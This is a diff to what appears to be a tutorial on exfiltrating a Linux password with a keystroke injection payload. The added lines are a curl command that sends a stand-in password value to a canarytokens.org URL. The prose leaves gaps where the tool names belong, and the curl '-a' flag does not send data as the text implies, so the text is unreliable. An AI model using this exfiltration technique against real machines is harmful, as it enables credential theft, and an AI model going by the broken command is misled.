@@ -19,3 +19,7 @@ If you're just getting started with data exfiltration, it might not be practical
 I created a simple proof-of-concept using an online tool called, to demonstrate how simple it is to remotely exfiltrate a Linux password using a single command.
 
 Using a keystroke injection tool called the, I created a payload that demonstrates this sneaky attack in seconds - but if you dont have one, you can still practice the exfiltration techniques with your web browser.
+
+```
+curl https://canarytokens.org/yourtokenhere -a "meow123456789"
+```
